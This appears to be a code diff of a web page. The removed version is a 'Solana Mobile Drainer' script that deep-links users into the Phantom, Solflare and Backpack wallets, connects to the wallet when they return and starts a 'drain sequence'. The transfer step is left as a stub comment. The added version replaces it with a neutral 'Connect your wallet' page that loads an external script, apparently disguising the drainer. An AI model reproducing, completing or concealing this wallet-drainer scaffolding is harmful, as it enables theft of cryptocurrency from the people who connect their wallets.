@@ -1,219 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Mobile Drainer</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            background-color: #121212;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-            padding: 2rem;
-            border-radius: 16px;
-            background-color: #1e1e1e;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
-        }
-        h1 {
-            margin-bottom: 1.5rem;
-            font-size: 1.5rem;
-        }
-        button {
-            display: block;
-            width: 100%;
-            padding: 1rem;
-            margin: 0.5rem 0;
-            border: none;
-            border-radius: 8px;
-            background-color: #333;
-            color: white;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        button:hover {
-            background-color: #444;
-        }
-        button#phantom-btn {
-            background-color: #ab9ff2;
-            color: #121212;
-            font-weight: bold;
-        }
-        button#solflare-btn {
-            background-color: #fc5f27;
-            font-weight: bold;
-        }
-        button#backpack-btn {
-            background-color: #0d7fc6;
-            font-weight: bold;
-        }
-        #status {
-            margin-top: 1rem;
-            font-size: 0.9rem;
-            color: #aaa;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet</title>
+  <link rel="stylesheet" href="/styles.css" />
 </head>
 <body>
-    <div class="container">
-        <h1>Solana Mobile Drainer</h1>
-        <button id="phantom-btn">Connect Phantom</button>
-        <button id="solflare-btn">Connect Solflare</button>
-        <button id="backpack-btn">Connect Backpack</button>
-        <div id="status">Select a wallet to begin...</div>
+  <main class="card">
+    <h1>Connect your wallet</h1>
+    <p class="sub">Select a wallet to continue</p>
+
+    <div class="wallets">
+      <button class="wallet" data-wallet="phantom">Phantom</button>
+      <button class="wallet" data-wallet="backpack">Backpack</button>
+      <button class="wallet" data-wallet="solflare">Solflare</button>
     </div>
 
-    <script>
-        class SolanaDrainer {
-            constructor() {
-                this.pendingWallet = null;
-                this.isDraining = false;
-                // Use the current page's URL as the return destination
-                this.returnUrl = encodeURIComponent(window.location.href); 
-                this.init();
-            }
+    <p id="status" class="status"></p>
+  </main>
 
-            init() {
-                if (this.justReturnedFromWallet()) {
-                    this.handleReturn();
-                } else {
-                    this.setupVisibilityListener();
-                }
-            }
-
-            justReturnedFromWallet() {
-                const referrer = document.referrer.toLowerCase();
-                return referrer.includes('phantom.app') || 
-                       referrer.includes('solflare.com') || 
-                       referrer.includes('backpack.app');
-            }
-
-            setupVisibilityListener() {
-                document.addEventListener('visibilitychange', () => {
-                    if (document.visibilityState === 'visible' && this.pendingWallet) {
-                        setTimeout(() => this.handleReturn(), 500);
-                    }
-                });
-            }
-
-            async handleReturn() {
-                if (this.isDraining) return;
-
-                const walletName = this.pendingWallet;
-                console.log(`[Drainer] Returning from ${walletName}, waiting for provider...`);
-
-                const provider = await this.waitForProvider(walletName, 3000);
-
-                if (!provider) {
-                    console.warn('[Drainer] Provider not found after return');
-                    this.resetState();
-                    return;
-                }
-
-                try {
-                    await provider.connect();
-                    
-                    if (provider.publicKey) {
-                        console.log(`[Drainer] Connected: ${provider.publicKey.toString()}`);
-                        this.startDrain(provider.publicKey, provider);
-                    }
-                } catch (e) {
-                    console.error('[Drainer] Connection failed', e);
-                    this.resetState();
-                }
-            }
-
-            waitForProvider(walletName, timeoutMs) {
-                return new Promise((resolve) => {
-                    const start = Date.now();
-                    const interval = setInterval(() => {
-                        if (Date.now() - start > timeoutMs) {
-                            clearInterval(interval);
-                            resolve(null);
-                            return;
-                        }
-
-                        let provider = null;
-                        if (walletName === 'phantom' && window.phantom?.isPhantom) provider = window.phantom.solana;
-                        if (walletName === 'solflare' && window.solflare?.isSolflare) provider = window.solflare;
-                        if (walletName === 'backpack' && window.backpack?.isBackpack) provider = window.backpack;
-
-                        if (provider) {
-                            clearInterval(interval);
-                            resolve(provider);
-                        }
-                    }, 100);
-                });
-            }
-
-            startDrain(publicKey, provider) {
-                this.isDraining = true;
-                console.log(`[Drainer] Starting drain sequence for ${publicKey.toString()}`);
-                
-                this.executeDrain(publicKey, provider);
-            }
-
-            executeDrain(publicKey, provider) {
-                console.log('[Drainer] Fetching token list...');
-                // This is where you would fetch tokens and send transactions
-                
-                console.log('[Drainer] Drain sequence initiated.');
-                
-                setTimeout(() => {
-                    this.resetState();
-                }, 5000);
-            }
-
-            resetState() {
-                this.pendingWallet = null;
-                this.isDraining = false;
-            }
-
-            triggerDeepLink(walletName) {
-                this.pendingWallet = walletName;
-                
-                let deeplink = '';
-                switch (walletName) {
-                    case 'phantom':
-                        // Phantom expects 'data' to be the URL to return to
-                        deeplink = `https://phantom.com/connect?data=${this.returnUrl}`;
-                        break;
-                    case 'solflare':
-                        // Solflare also uses 'data'
-                        deeplink = `https://solflare.com/connect/?data=${this.returnUrl}`;
-                        break;
-                    case 'backpack':
-                        // Backpack uses 'link'
-                        deeplink = `https://backpack.app/deeplink?link=${this.returnUrl}`;
-                        break;
-                }
-                
-                console.log(`[Drainer] Opening deep link: ${deeplink}`);
-                window.location.href = deeplink;
-            }
-        }
-
-        const drainer = new SolanaDrainer();
-
-        document.getElementById('phantom-btn').addEventListener('click', () => {
-            drainer.triggerDeepLink('phantom');
-        });
-
-        document.getElementById('solflare-btn').addEventListener('click', () => {
-            drainer.triggerDeepLink('solflare');
-        });
-
-        document.getElementById('backpack-btn').addEventListener('click', () => {
-            drainer.triggerDeepLink('backpack');
-        });
-    </script>
+  <script type="module" src="/app.js"></script>
 </body>
 </html>
